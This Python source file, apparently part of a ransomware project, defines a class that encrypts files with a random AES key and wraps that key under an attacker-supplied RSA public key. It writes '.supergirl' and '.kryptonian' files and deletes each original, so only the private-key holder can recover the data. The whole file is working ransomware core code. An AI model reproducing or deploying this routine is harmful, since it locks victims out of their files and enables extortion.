from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend
from AES.RandomKeyGen import RandomKeyGen
from Crypto import Random
from Crypto.Cipher import AES
import base64
import os
import Config


class FileCrypter:
    def __init__(self):
        self.key, self.iv = RandomKeyGen().getKey()
        self.encoding = 'utf-8'

    def pad(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

    def encrypt(self, message, key, key_size=256):
        message = self.pad(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)

    def decrypt(self, ciphertext, key):
        iv = ciphertext[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def encrypt_file(self, file_name, client_pub_key):
        if not os.path.isfile(file_name):
            return

        #calculate the MAX_SIZE in GB
        file_size = os.path.getsize(file_name) * 0.000000001
        if file_size > Config.MAX_SIZE_LIMIT:
            return

        public_key = serialization.load_ssh_public_key(
            bytes(client_pub_key, 'utf-8'),
            backend=default_backend()
        )

        #write the AES encryption key into a seperate file
        keyb64 = base64.b64encode(self.key)
        ivb64 = base64.b64encode(self.iv)
        t = bytes(keyb64.decode(self.encoding) + ";" + ivb64.decode(self.encoding), self.encoding)

        cipher = public_key.encrypt(
            t,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA1(),
                label=None
            )
        )

        cipher = base64.b64encode(cipher)


        with open(file_name, 'rb') as fo:
            plaintext = fo.read()

        enc = self.encrypt(plaintext, self.key)

        with open(file_name + ".supergirl", 'wb') as fo:
            fo.write(enc)

        with open(file_name + ".kryptonian", 'wb') as info:
            info.write(cipher)
        os.remove(file_name)

    def decrypt_file(self, file_name, privateKeyStr):
        if not os.path.isfile(file_name):
            return


        private_key = serialization.load_pem_private_key(
            bytes(privateKeyStr, 'utf-8'),
            password=None,
            backend=default_backend()
        )

        tmp_name = file_name[:-10]
        aes_line = open(tmp_name + '.kryptonian', 'rb').readline().strip()
        aes_line = base64.b64decode(aes_line)

        aes_iv_clear = private_key.decrypt(
            aes_line,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA1(),
                label=None
            )
        )
        aes_iv_clear = aes_iv_clear.decode(self.encoding)
        aes_iv_clear = aes_iv_clear.split(';')[0]
        aes_iv_clear = base64.b64decode(aes_iv_clear)

        with open(file_name, 'rb') as fo:
            ciphertext = fo.read()
        dec = self.decrypt(ciphertext, aes_iv_clear)
        with open(file_name[:-10], 'wb') as fo:
            fo.write(dec)
        os.remove(file_name)
        os.remove(tmp_name + '.kryptonian')